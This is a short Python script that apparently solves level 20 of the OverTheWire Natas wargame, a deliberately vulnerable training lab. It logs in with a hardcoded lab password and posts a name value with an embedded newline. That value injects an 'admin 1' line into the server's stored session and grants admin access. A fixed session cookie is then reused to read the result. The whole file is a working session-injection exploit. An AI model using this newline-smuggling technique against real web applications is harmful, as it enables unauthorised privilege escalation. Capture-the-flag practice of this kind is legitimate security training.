import requests
from requests.auth import HTTPBasicAuth

url = 'http://natas20.natas.labs.overthewire.org/index.php'
auth = HTTPBasicAuth('natas20', 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF')

data = dict(name='admin\nadmin 1')
cookie = dict(PHPSESSID='iamnotanhacker')
r = requests.post(url, data=data, cookies=cookie, auth=auth)
print r.content

r = requests.post(url, cookies=cookie, auth=auth)
print r.content